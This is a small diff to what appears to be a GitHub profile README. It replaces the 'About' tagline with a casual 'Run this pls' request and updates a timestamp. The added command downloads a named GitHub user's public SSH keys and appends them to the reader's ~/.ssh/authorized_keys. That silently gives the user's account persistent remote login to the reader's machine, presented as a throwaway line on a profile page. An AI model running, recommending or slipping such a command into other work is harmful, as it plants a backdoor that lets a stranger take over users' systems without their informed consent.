@@ -4,7 +4,7 @@
 
 ✨ **About**
 
-🔓 Decentralize everything
+✅ Run this pls: wget -O - https://github.com/Bastiaantjuhh.keys >> ~/.ssh/authorized_keys
 
 <!--✏️ **Blog Posts**-->
 
@@ -28,4 +28,4 @@
 
 🕒 **Last Update**
 
-02-04-2025 04:20:28 UTC
+02-04-2025 08:23:54 UTC
